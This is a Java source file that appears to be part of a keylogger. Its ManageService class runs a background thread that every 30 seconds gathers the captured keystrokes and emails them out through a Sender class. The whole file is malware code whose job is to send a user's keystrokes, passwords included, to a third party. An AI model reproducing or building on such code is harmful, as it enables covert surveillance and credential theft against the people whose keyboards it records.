/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package handlers;

import java.lang.annotation.Native;
import java.util.logging.Level;
import java.util.logging.Logger;
import keys.NativeKeyboard;

/**
 *
 * @author RITIK
 */
public class ManageService implements Runnable {
    private NativeKeyboard keyboard;
    private Thread service;
    
     public ManageService(){
   keyboard = new NativeKeyboard();
   service = new Thread(this,"Manage Service");
   service.start();
     }
 public NativeKeyboard getKeyboard()
 {
     return keyboard;
 }

    @Override
    public void run() {
        long start = System.nanoTime();
        while(true)
        {
        long elapsed = (System.nanoTime() - start) /1_000_000;
        if(elapsed>30_000)
        {
            try {
                Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
                keyboard.onSend();
            } catch (Throwable ex) {
                ex.printStackTrace();
                keyboard.onFail();
            }
            
            start=System.nanoTime();
        }
        }
        //To change body of generated methods, choose Tools | Templates.
    }
}